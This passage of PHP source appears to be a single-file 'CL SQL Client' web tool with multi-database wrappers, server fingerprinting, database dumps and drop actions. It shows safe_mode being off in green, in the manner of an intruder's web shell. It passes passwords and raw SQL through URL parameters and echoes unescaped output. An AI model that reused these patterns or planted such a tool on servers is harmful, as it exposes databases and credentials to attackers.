  switch ($dbtype) {
   case "mysql":
    return mysql_field_name($res,$count);
   break;;
   default:
   break;;
  }
 }
}

if (!function_exists("sql_logout")) {
 function sql_logout($id) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $dbi=@mysql_close($id);
    return $dbi;
   break;;
   case "mSQL":
    $dbi=@msql_close($id);
    return $dbi;
   break;;
   case "postgres":
   case "postgres_local":
    $dbi=@pg_close($id);
    return $dbi;
   break;;
   case "ODBC":
   case "ODBC_Adabas":
    $dbi=@odbc_close($id);
    return $dbi;
   break;;
   case "Interbase":
    $dbi=@ibase_close($id);
    return $dbi;
   break;;
   case "Sybase":
    $dbi=@sybase_close($id);
    return $dbi;
   break;;
   default:
   break;;
  }
 }
}

if (!function_exists("get_server_info")) {
 function get_server_info() {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    return "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info().")";
   break;;
   default:
    return "unknown";
   break;;
  }
 }
}

if (!function_exists("sql_num_fields")) {
 function sql_num_fields($res) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    return mysql_num_fields($res);
   break;;
   case "mSQL":
    return msql_num_fields($res);
   break;;
   default:
   break;;
  }
 }
}

if (!function_exists("sql_affected_rows")) {
 function sql_affected_rows() {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    return mysql_affected_rows();
   break;;
   case "mSQL":
    return msql_affected_rows();
   break;;
   default:
   break;;
  }
 }
}

/*
 * sql_query($query, $id)
 * executes an SQL statement, returns a result identifier
 */
if (!function_exists("sql_query")) {
 function sql_query($query, $id) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $res=mysql_query($query, $id);
    return $res;
   break;;
   case "mSQL":
    $res=@msql_query($query, $id);
    return $res;
   break;;
   case "postgres":
   case "postgres_local":
    $res=pg_exec($id,$query);
    $result_set = new ResultSet;
    $result_set->set_result( $res );
    $result_set->set_total_rows( sql_num_rows( $result_set ) );
    $result_set->set_fetched_rows( 0 );
    return $result_set;
   break;;
   case "ODBC":
   case "ODBC_Adabas":
    $res=@odbc_exec($id,$query);
    return $res;
   break;;
   case "Interbase":
    $res=@ibase_query($id,$query);
    return $res;
   break;;
   case "Sybase":
    $res=@sybase_query($query, $id);
    return $res;
   break;;
   default:
   break;;
  }
 }
}

/*
 * sql_num_rows($res)
 * given a result identifier, returns the number of affected rows
 */
if (!function_exists("sql_num_rows")) {
 function sql_num_rows($res) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $rows=mysql_num_rows($res);
    return $rows;
   break;;
   case "mSQL":
    $rows=msql_num_rows($res);
    return $rows;
   break;;
   case "postgres":
   case "postgres_local":
    $rows=pg_numrows( $res->get_result() );
    return $rows;
   break;;
   case "ODBC":
   case "ODBC_Adabas":
    $rows=odbc_num_rows($res);
    return $rows;
   break;;
   case "Interbase":
    echo "<BR>Error! PHP dosen't support ibase_numrows!<BR>";
    return false;
   break;;
   case "Sybase":
    $rows=sybase_num_rows($res);
    return $rows;
   break;;
   default:
   break;;
  }
 }
}

/*
 * sql_fetch_row(&$res,$row)
 * given a result identifier, returns an array with the resulting row
 * Needs also a row number for compatibility with postgres
 */
if (!function_exists("sql_fetch_row")) {
 function sql_fetch_row(&$res, $nr=0) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $row = mysql_fetch_row($res);
    return $row;
   break;;
   case "mSQL":
    $row = msql_fetch_row($res);
    return $row;
   break;;
   case "postgres":
   case "postgres_local":
    if ( $res->get_total_rows() > $res->get_fetched_rows() ) {
     $row = pg_fetch_row($res->get_result(), $res->get_fetched_rows() );
     $res->increment_fetched_rows();
     return $row;
    } else {
     return false;
    }
   break;;
   case "ODBC":
   case "ODBC_Adabas":
    $row = array();
    $cols = odbc_fetch_into($res, $nr, $row);
    return $row;
   break;;
   case "Interbase":
    $row = ibase_fetch_row($res);
    return $row;
   break;;
   case "Sybase":
    $row = sybase_fetch_row($res);
    return $row;
   break;;
   default:
   break;;
  }
 }
}

/*
 * sql_fetch_array($res,$row)
 * given a result identifier, returns an associative array
 * with the resulting row using field names as keys.
 * Needs also a row number for compatibility with postgres.
 */
if (!function_exists("sql_fetch_array")) {
 function sql_fetch_array($res, $nr=0) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $row = array();
    $row = mysql_fetch_array($res, MYSQL_ASSOC);
    return $row;
   break;;
   case "mSQL":
    $row = array();
    $row = msql_fetch_array($res,$nr);
    return $row;
   break;;
   case "postgres":
   case "postgres_local":
    if( $res->get_total_rows() > $res->get_fetched_rows() ) {
     $row = array();
     $row = pg_fetch_array($res->get_result(), $res->get_fetched_rows() );
     $res->increment_fetched_rows();
     return $row;
    } else {
     return false;
    }
   break;;
/*
 * ODBC doesn't have a native _fetch_array(), so we have to
 * use a trick. Beware: this might cause HUGE loads!
 */
   case "ODBC":
    $row = array();
    $result = array();
    $result = odbc_fetch_row($res, $nr);
    $nf = odbc_num_fields($res); /* Field numbering starts at 1 */
    for($count=1; $count < $nf+1; $count++) {
     $field_name = odbc_field_name($res, $count);
     $field_value = odbc_result($res, $field_name);
     $row[$field_name] = $field_value;
    }
    return $row;
   break;;
   case "ODBC_Adabas":
    $row = array();
    $result = array();
    $result = odbc_fetch_row($res, $nr);
    $nf = count($result)+2; /* Field numbering starts at 1 */
    for($count=1; $count < $nf; $count++) {
     $field_name = odbc_field_name($res, $count);
     $field_value = odbc_result($res, $field_name);
     $row[$field_name] = $field_value;
    }
    return $row;
   break;;
   case "Interbase":
    $orow=ibase_fetch_object($res);
    $row=get_object_vars($orow);
    return $row;
   break;;
   case "Sybase":
    $row = sybase_fetch_array($res);
    return $row;
   break;;
  }
 }
}

if (!function_exists("sql_fetch_assoc")) {
 function sql_fetch_assoc($res) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $row = array();
    $row = mysql_fetch_assoc($res);
    return $row;
   break;;
   case "mSQL":
    $row = array();
    $row = msql_fetch_assoc($res);
    return $row;
   break;;
  }
 }
}

if (!function_exists("sql_fetch_object")) {
 function sql_fetch_object(&$res, $nr=0) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $row = mysql_fetch_object($res);
    if($row) return $row;
    else return false;
   break;;
   case "mSQL":
    $row = msql_fetch_object($res);
    if($row) {
     return $row;
    } else {
     return false;
    }
   break;;
   case "postgres":
   case "postgres_local":
    if( $res->get_total_rows() > $res->get_fetched_rows() ) {
     $row = pg_fetch_object( $res->get_result(), $res->get_fetched_rows() );
     $res->increment_fetched_rows();
     if($row) {
      return $row;
     } else {
      return false;
     }
    } else {
     return false;
    }
   break;;
   case "ODBC":
    $result = odbc_fetch_row($res, $nr);
    if(!$result) return false;
    $nf = odbc_num_fields($res); /* Field numbering starts at 1 */
    for($count=1; $count < $nf+1; $count++) {
     $field_name = odbc_field_name($res, $count);
     $field_value = odbc_result($res, $field_name);
     $row->$field_name = $field_value;
    }
    return $row;
   break;;
   case "ODBC_Adabas":
    $result = odbc_fetch_row($res, $nr);
    if(!$result) return false;
    $nf = count($result)+2; /* Field numbering starts at 1 */
    for($count=1; $count < $nf; $count++) {
     $field_name = odbc_field_name($res, $count);
     $field_value = odbc_result($res, $field_name);
     $row->$field_name = $field_value;
    }
    return $row;
   break;;
   case "Interbase":
    $orow = ibase_fetch_object($res);
    if($orow) {
     $arow=get_object_vars($orow);
     while(list($name,$key)=each($arow)) {
      $name=strtolower($name);
      $row->$name=$key;
    }
     return $row;
    } else return false;
   break;;
   case "Sybase":
    $row = sybase_fetch_object($res);
    return $row;
   break;;
  }
 }
}

/*
 * Function Free Result for function free the memory
 */
if (!function_exists("sql_free_result")) {
 function sql_free_result($res) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    return mysql_free_result($res);
   break;;
   case "mSQL":
    return msql_free_result($res);
   break;;
   case "postgres":
   case "postgres_local":
    return pg_FreeResult( $res->get_result() );
   break;;
   case "ODBC":
   case "ODBC_Adabas":
    return odbc_free_result($res);
   break;;
   case "Interbase":
    echo( "<BR>Error! PHP dosen't support ibase_free_result!<BR>" );
   break;;
   case "Sybase":
    return sybase_free_result($res);
   break;;
  }
 }
}

/*
 * Function Format Size
 */
if (!function_exists("formatsize")) {
 function formatsize( $value = false ){
  if($value >= 1073741824) {
   $value = round($value / 1073741824 * 100) / 100 . "Gb";
  } elseif($value >= 1048576) {
   $value = round($value / 1048576 * 100) / 100 . "Mb";
  } elseif($value >= 1024) {
   $value = round($value / 1024 * 100) / 100 . "Kb";
  } else {
   $value = $value . "b";
  }
  return $value;
 }
}

/*
 * Return Alphanumerical chars
 */
if (!function_exists("AlphanumericalClean")) {
 function AlphanumericalClean( $str = false ) {
  return preg_replace( "/[^а-яА-Яa-zA-Z0-9\-\_\ ]/", "" , $str );
 }
}

/*
 * Get server info
 */
if (!function_exists("server_info")) {
 function server_info() {
  global $tmpdir,$baseurl;
  if (empty($tmpdir)) {
   $tmpdir = ini_get("upload_tmp_dir");
   if (is_dir($tmpdir)) {$tmpdir = realpath("./");}
  }
  $tmpdir = @realpath($tmpdir);
  // Safe mod checking
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
   $safemode = "<font color=\"red\">ON (secure)</font>";
  } else {
   $safemode = "<font color=\"green\">OFF (not secure)</font>";
  }
  // Open Base dir
  if (@ini_get("open_basedir") or strtolower(@ini_get("open_basedir")) == "on")  {

   $openbasedir = "<font color=\"red\">ON (secure)</font>";
  } else {
   $openbasedir = "<font color=\"green\">OFF (not secure)</font>";
  }
  // Return information about server in array
  return array
         (
          "OS"              => wordwrap(php_uname(),90,"<BR>",1),
          "TMP_DIR"         => $tmpdir,
          "UID"             => getmyuid(),
          "GID"             => getmygid(),
          "Process PID"     => getmypid(),
          "Server Software" => $_SERVER["SERVER_SOFTWARE"],
          "PHP version"     => "<a href=\"".$baseurl."&act=14\">".phpversion()."</a>",
          "SafeMod"         => $safemode,
          "Open Base Dir"   => $openbasedir,
          "SQL version"     => get_server_info(),
          "Server name"     => $_SERVER["SERVER_NAME"],
          "Current user"    => get_current_user(),
         );
 }
}

/*
 * SQL error reporting
 */
function error($error, $query) {
 echo(nl2br( '<script>'."alert('"."\\n\\nThe following query failed\\n\\nSQL error message: \\n".addslashes($error)."\\n\\nFollowing query: `".addslashes($query)."`\\n\\n"."')".'</script>'."<BR><BR><font color=\"red\">Query execute faild</font><BR><hr width=\"400\"><BR>Please click <a href=\"javascript:history.back(-1)\">here</a> to go back\n\n"));
}

/*
 * SQL query execute
 */
function query($id, $query) {
 global $lang,$language;
 $res = '';
 if((isset($query)) && (!empty($query))) {
  $query = stripslashes($query);
  $res = sql_query($query, $id);
  if (sql_error()) {
   error(sql_error(), $query);
  } else {
   return $res;
  }
 } else {
  return false;
 }
}

/*
 * SQL quick launch
 */
function quicklaunch() {
 global $lang,$language,$baseurl,$server,$port,$login,$password;
 $quicklaunch = array
   (
    array($lang[$language.'_text1'],$baseurl."&act=11"),
    array($lang[$language.'_text2'],$baseurl."&act=09"),
    array($lang[$language.'_text3'],$baseurl."&act=01"),
    array($lang[$language.'_text4'],$baseurl."&act=00"),
    array($lang[$language.'_text5'],$baseurl."&act=08"),
    array($lang[$language.'_text30'],$baseurl."&act=13"),
   );
 $str = "<table border=\"0\" width=\"960\">\n<tr align=\"center\">\n <td rowspan=\"2\" width=\"46\"><a href=\"javascript:history.back(-1)\" title=\"Назад\"><img src=\"".basename(__FILE__)."?image=back\"></a></td>\n <td rowspan=\"2\" width=\"47\"><a href=\"javascript:location.reload();\" title=\"Refresh\"><img src=\"".basename(__FILE__)."?image=reload\"></a></td>\n <td rowspan=\"2\" width=\"48\"><a href=\"".$baseurl."\" title=\"На главную\"><img src=\"".basename(__FILE__)."?image=home\"></a></td>\n <td rowspan=\"2\" width=\"48\"><a href=\"".basename(__FILE__)."?\" title=\"Login page\"><img src=\"".basename(__FILE__)."?image=log_in_off\"></a></td>\n <td colspan=\"".count($quicklaunch)."\" width=\"760\"><hr><img border=\"0\" src=\"".basename(__FILE__)."?image=info\" align=\"absmiddle\"><B>".get_server_info()." running in ".AlphanumericalClean($server).":".AlphanumericalClean($port)." as ".AlphanumericalClean($login)." </B><BR><hr></td>\n</tr>\n<tr>";
 if (count($quicklaunch) > 0) {
  foreach($quicklaunch as $item) {
   $str .= "\n <td align=\"center\">[ <a href=\"".$item[1]."\">".$item[0]."</a> ]</td>";
  }
 }
 $str .= "\n</tr>\n</table>\n<BR>";
 return $str;
}

/*
 * List Of DB`s
 */
function db_list($id) {
 global $lang,$language,$baseurl;
 $db_list = query($id, "SHOW DATABASES"); // [-]
 $db_count = sql_num_rows($db_list);
 $str = "<img border=\"0\" src=\"".basename(__FILE__)."?image=db\" valign=\"middle\"><B>".$lang[$language.'_text6']."</B>\n<table border=\"0\" width=\"200\">\n<tr align=\"center\">\n <td colspan=\"2\"><B>".$lang[$language.'_text7']."</B></td>\n <td colspan=\"2\"><B>".$lang[$language.'_text8']."</B></td>\n</tr>";
 while($odj = sql_fetch_object($db_list)) {
  //$tbls = sql_num_rows(mysql_list_tables($tmp[1])); [-]
  $str .= "\n<tr align=\"center\">\n <td><img border=\"0\" src=\"".basename(__FILE__)."?image=browse_db\" align=\"absmiddle\"></td>\n <td><a href=\"".$baseurl."&act=02&db=".$odj->Database."\">".$odj->Database."</a></td>\n <td><a href=\"".$baseurl."&act=10&dump=db&db=".$odj->Database."\" title=\"Backup Database ".$odj->Database."\"><img src=\"".basename(__FILE__)."?image=save\" align=\"absmiddle\"></a></td>\n <td><a href=\"javascript: confirm_function('".$baseurl."&act=03&db=".$odj->Database."');\" title=\"Drop Database ".$odj->Database."\"><img src=\"".basename(__FILE__)."?image=drop\" align=\"center\"></a>\n</tr>";
 }
 $str .= "\n<tr align=\"center\">\n <td colspan=\"4\">".$lang[$language.'_text10'].": <B>".$db_count."</B></td>\n</tr>\n<tr align=\"center\">\n <td colspan=\"4\"><a href=\"".$baseurl."&act=04\">[ ".$lang[$language.'_text9']." ]</a></td>\n</tr>\n</table>\n";
 return $str;
}

/*
 * SQL dump DB
 */
function dump_db($id, $db,& $type) {
 global $lang,$language,$baseurl,$dbtype;
 $tmp = server_info();
 $act_sql = query( $id, "SHOW TABLES FROM `".AlphanumericalClean($db)."`" );
 if (sql_num_rows($act_sql) > 0) {
  if((isset($type))) {
   $file = $tmp["TMP_DIR"]."/db_".$_SERVER["SERVER_NAME"]."_".$dbtype."_".date("Y-m-d-H-i-s").".sql";
   $fp = fopen($file, "w");
   if (!$fp) {
    return "<BR>Dump error! Can't write to ".htmlspecialchars($file);
   }
   fputs ($fp, "#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n# [ SQL Client ]\n# Dumped by SQL Client \n#\n# SQL version: (".get_server_info().")\n# Date: ".date("F j, Y, g:i a")."\n# Dump DB: `$db`"."\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  }
  switch($type) {
   case "struct":
    while ($tbl = sql_fetch_row($act_sql)) {
     fputs($fp, "\n#\n# Dump for table: `".$tbl[0]."`;\n#\n");
     fputs($fp, "\nDROP TABLE IF EXISTS `".$tbl[0]."`;\n");
     $sql = query( $id, "SHOW CREATE TABLE `$tbl[0]`");
     $row = sql_fetch_row($sql);
     fputs($fp, $row[1].";\n\n");
    }
   break;
   case "data":
    while ($tbl = sql_fetch_row($act_sql)) {
     fputs($fp, "\n#\n# Dump for table: `".$tbl[0]."`;\n#\n");
     $sql = query( $id, "SELECT * FROM `$tbl[0]`" );
     if (sql_num_rows($sql) > 0) {
      while ($row = sql_fetch_assoc($sql)) {
       $keys = implode("`, `", array_keys($row));
       $values = array_values($row);
       foreach($values as $key=>$value) {
        $values[$key] = addslashes($value);
       }
       $values = implode("', '", $values);
       $sql_dump = "INSERT INTO `$tbl[0]` (`".$keys."`) VALUES ('".$values."');\n";
       fputs($fp, $sql_dump);
      }
     } else {
      fputs($fp, "# TABLE `$tbl[0]` IS AMPTY\n\n");
     }
    }
   break;
   case "full":
    while ($tbl = sql_fetch_row($act_sql)) {
     fputs($fp, "\n#\n# Dump for table: `".$tbl[0]."`;\n#\n");
     fputs($fp, "\nDROP TABLE IF EXISTS `".$tbl[0]."`;\n");
     $sql = query( $id, "SHOW CREATE TABLE `$tbl[0]`");
     $row = sql_fetch_row($sql);
     fputs($fp, $row[1].";\n\n");
     $sql = query( $id, "SELECT * FROM `$tbl[0]`" );
     if (sql_num_rows($sql) > 0) {
      while ($row = sql_fetch_assoc($sql)) {
       $keys = implode("`, `", array_keys($row));
       $values = array_values($row);
       foreach($values as $key=>$value) {
        $values[$key] = addslashes($value);
       }
       $values = implode("', '", $values);
       $sql_dump = "INSERT INTO `$tbl[0]` (`".$keys."`) VALUES ('".$values."');\n";
       fputs($fp, $sql_dump);
      }
     } else {
      fputs($fp, "# TABLE `$tbl[0]` IS AMPTY\n\n");
     }
    }
   break;
   default:
    return "<BR><BR><B>Backup DataBase</B><BR><table><tr> <td><a href=\"".$baseurl."&act=10&dump=db&db=".$db."&type=full\">Full backup (Strukture and Data)</a></td></tr><tr> <td><a href=\"".$baseurl."&act=10&dump=db&db=".$db."&type=struct\">Only Structure</a></td></tr><tr> <td><a href=\"".$baseurl."&act=10&dump=db&db=".$db."&type=data\">Only data info</a></td></tr></table>";
   break;
  }
  fclose($fp);
 } else {
  return "\n<BR><BR>Database ".AlphanumericalClean($db)." is empty or Database doesn't exist";
 }
 return "\n<BR><BR><font color=\"green\">Dumped! Dump has been writed to <a href=\"".$baseurl."&act=11&file=".urlencode(realpath($file))."\">".htmlspecialchars(realpath($file))."</a> (".formatsize(@filesize($file)).")</font><BR><BR>\n<img border=\"0\" src=\"".basename(__FILE__)."?image=download\">&nbsp;<B>".$lang[$language.'_text26']."</B>&nbsp;<a href=\"".$baseurl."&act=12&file=".urlencode($file)."\">Click</a>";
}


/*
 * SQL dump table
 */
function dump_tbl($id, $tbl, $type) {
 global $lang,$language,$baseurl,$dbtype;
 $tmp = server_info();
 if((isset($type))) {
  $file = $tmp["TMP_DIR"]."/tbl_".$_SERVER["SERVER_NAME"]."_".$dbtype."_".date("Y-m-d-H-i-s").".sql";
  $fp = fopen($file, "w");
  if (!$fp) {
   return "<BR>Dump error! Can't write to ".htmlspecialchars($file);
  }
  fputs ($fp, "#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n# [ SQL Client ]\n# Dumped by SQL Client \n#\n# SQL version: (".get_server_info().")\n# Date: ".date("F j, Y, g:i a")."\n# Dump table: `$tbl`"."\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
 }
 switch($type) {
  case "struct":
   fputs($fp, "\nDROP TABLE IF EXISTS `".$tbl."`;\n");
   $sql = query( $id, "SHOW CREATE TABLE `".$tbl."`");
   $row = sql_fetch_row($sql);
   fputs($fp, $row[1].";\n\n");
  break;
  case "data":
   $sql = query( $id, "SELECT * FROM `".$tbl."`" );
   if (sql_num_rows($sql) > 0) {
    while ($row = sql_fetch_assoc($sql)) {
     $keys = implode("`, `", array_keys($row));
     $values = array_values($row);
     foreach($values as $key=>$value) {
      $values[$key] = addslashes($value);
     }
     $values = implode("', '", $values);
     $sql_dump = "INSERT INTO `$tbl` (`".$keys."`) VALUES ('".$values."');\n";
     fputs($fp, $sql_dump);
    }
   } else {
    fputs($fp, "# TABLE `$tbl` IS AMPTY\n\n");
   }
  break;
  case "full":
   fputs($fp, "\nDROP TABLE IF EXISTS `".$tbl."`;\n");
   $sql = query( $id, "SHOW CREATE TABLE `".$tbl."`");
   $row = sql_fetch_row($sql);
   fputs($fp, $row[1].";<BR><BR>");
   $sql = query( $id, "SELECT * FROM `$tbl`" );
   if (sql_num_rows($sql) > 0) {
    while ($row = sql_fetch_assoc($sql)) {
     $keys = implode("`, `", array_keys($row));
     $values = array_values($row);
     foreach($values as $key=>$value) {
      $values[$key] = addslashes($value);
     }
     $values = implode("', '", $values);
     $sql_dump = "INSERT INTO `$tbl` (`".$keys."`) VALUES ('".$values."');\n";
     fputs($fp, $sql_dump);
    }
   } else {
    fputs($fp, "# TABLE `$tbl` IS AMPTY\n\n");
   }
   break;
   default:
    return "\n<BR><BR><B>Backup Table</B><BR><table><tr> <td><a href=\"".$baseurl."&act=10&dump=tbl&tbl=".$tbl."&type=full\">Full backup (Strukture and Data)</a></td></tr><tr> <td><a href=\"".$baseurl."&act=10&dump=tbl&tbl=".$tbl."&type=struct\">Only Structure</a></td></tr><tr> <td><a href=\"".$baseurl."&act=10&dump=tbl&tbl=".$tbl."&type=data\">Only data info</a></td></tr></table>";
   break;
 }
 fclose($fp);
 return "\n<BR><BR><font color=\"green\">Dumped! Dump has been writed to <a href=\"".$baseurl."&act=11&file=".urlencode(realpath($file))."\">".htmlspecialchars(realpath($file))."</a> (".formatsize(@filesize($file)).")</font><BR><BR>\n<img border=\"0\" src=\"".basename(__FILE__)."?image=download\">&nbsp;<B>".$lang[$language.'_text26']."</B>&nbsp;<a href=\"".$baseurl."&act=12&file=".urlencode($file)."\">Click</a>";
}

// Check Variables
if(isset($dbtype)) {
 if($server) {
  $server = AlphanumericalClean($server);
  $baseurl .= "&server=".$server;
 }
 if($port) {
  $port = intval($port);
  $baseurl .= "&port=".AlphanumericalClean($port);
 }
 if(empty($login)) {
  $login = 'nobody';
 }
 $login = AlphanumericalClean($login);
 $baseurl .= "&login=".$login;

 if($passwd) {
  $password = AlphanumericalClean($password);
  $baseurl .= "&password=".$password;
 } else {
  $baseurl .= "&password=";
 }
 if($db) {
  $db = AlphanumericalClean($db);
  $baseurl .= "&db=".$db;
 }
 $baseurl .= "&dbtype=".$dbtype;
 // Return identificator
 $id = sql_connect($server.":".$port, $login, $password, $db) or die("ERROR! Can't connect to SQL server");
} else {
 die("<form method=\"post\">\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\" height=\"100%\">\n<tr height=\"115\">\n <td height=\"115\" align=\"center\" valign=\"middle\"><center><h1>CL SQL Client Login</h1>\n<table border=\"0\" cellpadding=\"5\" cellspacing=\"3\">\n<tr>\n <td>Username:</td>\n <td><input type=\"text\" name=\"login\" value=\"\" size=\"24\"></td>\n</tr>\n<tr>\n <td>Password:</td>\n <td><input type=\"password\" name=\"password\" size=\"24\"></td>\n</tr>\n<tr>\n <td>Server IP:</td>\n <td><input type=\"text\" name=\"server\" value=\"localhost\" size=\"24\"></td>\n</tr>\n<tr>\n <td>Server Port:</td>\n <td><input type=\"text\" name=\"port\" value=\"3306\" size=\"24\"></td>\n</tr>\n<tr>\n <td>SQL Server (type):</td>\n <td><select name=\"dbtype\"><option value=\"mysql\">mySQL</option><option value=\"msql\">mSQL</option><option value=\"postgres\">PostgresSQL</option><option value=\"Interbase\">Interbase</option><option value=\"Sybase\">Sybase</option><option value=\"Sybase\">ODBC</option></select></td>\n</tr>\n<tr>\n <td colspan=\"2\" align=\"right\" valign=\"middle\"><input type=\"submit\" value=\"Login\"></td>\n</tr>\n</table>\n</center></td>\n</tr>\n</table>\n</form>");
}


//--------------------------------
//  HTML header
//--------------------------------
//
echo "<html>\n<head>\n<title>[  CL SQL Client  ]</title>\n<meta http-equiv=Content-Type Pragma: no-cache; content=\"text/html; charset=windows-1251\">\n<style>\n* {\n margin: 0;\n padding: 0;\n}\nbody {\n margin-top: 1px;\n margin-right: 1px;\n margin-bottom: 1px;\n margin-left: 1px;\n background-color: #CCCCCC;\n font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;\n font-size:12px;\n}
table {\n padding: 0em;\n font-size: 0.85em;\n background-color: #D7D8DA;\n}\ntr {\n font-size:12px;\n BORDER-RIGHT: #aaaaaa 1px solid;\n BORDER-TOP: #eeeeee 1px solid;\n BORDER-LEFT: #eeeeee 1px solid;\n BORDER-BOTTOM: #aaaaaa 1px solid;\n}\ntd {\n font-size:12px;\n BORDER-RIGHT: #aaaaaa 1px solid;\n BORDER-TOP: #eeeeee 1px solid;\n BORDER-LEFT: #eeeeee 1px solid;\n BORDER-BOTTOM: #aaaaaa 1px solid;\n}\na {\n color: #003366;\n text-decoration: none;\n}\na:hover {\n color: #003366;\n}\na img {\n border: none;\n}\ninput,textarea,select {\n font-family: Verdana, Tahoma, Helvetica, Arial, sans-serif;\n font-size: 1em;\n}\n</style>\n<script language=\"javascript\">function confirm_function(url) {\n if(confirm('Вы уверены?')){\n  window.location = ''+url;\n }\n}</script></head>\n<body>\n".quicklaunch()."\n<table border=\"0\" width=\"960\">\n<tr align=\"center\" valign=\"top\">\n <td width=\"200\">".db_list($id)."</td>\n<td width=\"760\">\n<center>\n";

// Switching $act
if($act == '00') {
 $sql = query($id, "SHOW VARIABLES");
 echo "\n<img border=\"0\" src=\"".basename(__FILE__)."?image=host\">&nbsp;<B>".$lang[$language.'_text4']."</B>\n<BR>";
 echo "\n<table border=\"0\" width=\"700\">\n<tr>\n <td><B>Name</B></td>\n <td><B>Value</B></td>\n</tr>";
 while ($row = sql_fetch_assoc($sql)) {
  echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\">\n <td><B>".$row["Variable_name"]."</B></td>\n <td>".$row["Value"]."</td>\n</tr>";
 }
 echo "\n</table>\n";
 @sql_free_result($sql);
 unset($sql);
} elseif($act == '01') {
 $sql = query($id, "SHOW STATUS");
 echo "\n<img border=\"0\" src=\"".basename(__FILE__)."?image=host\">&nbsp;<B>".$lang[$language.'_text3']."</B>\n<BR>";
 echo "\n<table border=\"0\" width=\"700\">\n<tr>\n <td><B>Name</B></td>\n <td><B>Value</B></td>\n</tr>";
 while ($row = sql_fetch_assoc($sql)) {
  echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\">\n <td><B>".$row["Variable_name"]."</B></td>\n <td>".$row["Value"]."</td>\n</tr>";
 }
 echo "\n</table>\n";
 @sql_free_result($sql);
 unset($sql);
} elseif($act == '02') {
 $quicklaunch = array
   (
    array($lang[$language.'_text15'],$baseurl."&act=07"),
    array($lang[$language.'_text12'],$baseurl."&act=10&dump=db&db=".$db),
    array($lang[$language.'_text13'],"javascript: confirm_function('".$baseurl."&act=03&db=".$db."');"),
   );
 echo "\n[ <img border=\"0\" src=\"".basename(__FILE__)."?image=browse_db\" align=\"absmiddle\"> ".$lang[$language.'_text7'].": <B>".AlphanumericalClean($db)."</B> ]<BR><BR>";
 if (count($quicklaunch) > 0) {
  foreach($quicklaunch as $item) {
   echo "[ <a href=\"".$item[1]."\"><B>".$item[0]."</B></a> ] ";
  }
 }
 if (!sql_num_rows(query($id, "SHOW TABLES FROM `".AlphanumericalClean($db)."`"))) { // [-]
  if(sql_error()) {
   echo "\n<BR><BR>".sql_error()."<BR>";
  } else {
   echo "\n<BR><BR><B>Database ".AlphanumericalClean($db)." is empty</B><BR>";
  }
 } else {
  $sql = query($id, "SHOW TABLE STATUS FROM `".$db."`");
  echo "\n<BR><BR><table border=\"0\" width=\"700\">\n<tr align=\"center\">\n <td colspan=\"2\">Table</td>\n <td>Rows</td>\n <td>Type</td>\n <td>Created</td>\n <td>Modified</td>\n <td>Size</td>\n <td colspan=\"3\">Quick Action</td>\n</tr>";
  while ($row = @sql_fetch_assoc($sql)) {
   echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\" align=\"center\" width=\"700\">\n <td><img border=\"0\" src=\"".basename(__FILE__)."?image=tbl\" align=\"absmiddle\"></td>\n <td><a href=\"".$baseurl."&act=05&tbl=".urlencode($row["Name"])."\">".$row["Name"]."</a></td>\n <td>".$row["Rows"]."</td> <td>".$row["Type"]."</td>\n <td>".$row["Create_time"]."</td>\n <td>".$row["Update_time"]."</td>\n <td>".formatsize($row["Avg_row_length"])."</td>\n <td><a href=\"".$baseurl."&act=10&dump=tbl&tbl=".$row["Name"]."\" title=\"Backup Table ".$row["Name"]."\"><img src=\"".basename(__FILE__)."?image=save\" align=\"absmiddle\"></a></td>\n <td><a href=\"javascript: confirm_function('".$baseurl."&act=09&query=".urlencode("DROP TABLE `".$row["Name"]."`")."');\" title=\"DROP Table ".$row["Name"]."\"><img src=\"".basename(__FILE__)."?image=drop\" align=\"absmiddle\"></a></td>\n <td><a href=\"javascript: confirm_function('".$baseurl."&act=09&query=".urlencode("DELETE FROM `".$row["Name"]."`")."');\" title=\"ClearTable ".$row["Name"]."\"><img src=\"".basename(__FILE__)."?image=clear\" align=\"absmiddle\"></a></td>\n</tr>";
  }
  echo "\n</table>\n";
  @sql_free_result($sql);
  unset($sql);
 }
} elseif($act == '03') {
 $sql = query($id, "DROP DATABASE `".AlphanumericalClean($db)."`");
 if($sql) {
  echo "\n<BR><BR><font color=\"green\">Database <B>".AlphanumericalClean($db)."</B> deleted successfully</font>";
 }
 @sql_free_result($sql);
 unset($sql);
} elseif($act == '04') {
 if(!isset($new_db)) {
  echo "\n<BR><BR><B>".$lang[$language.'_text9']."</B><BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"act\" value=\"04\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">".$lang[$language.'_text7'].": <input type=\"text\" name=\"new_db\" value=\"\" maxlength=\"10\">\n<input type=\"submit\" value=\"create\">\n</form>";
 } else {
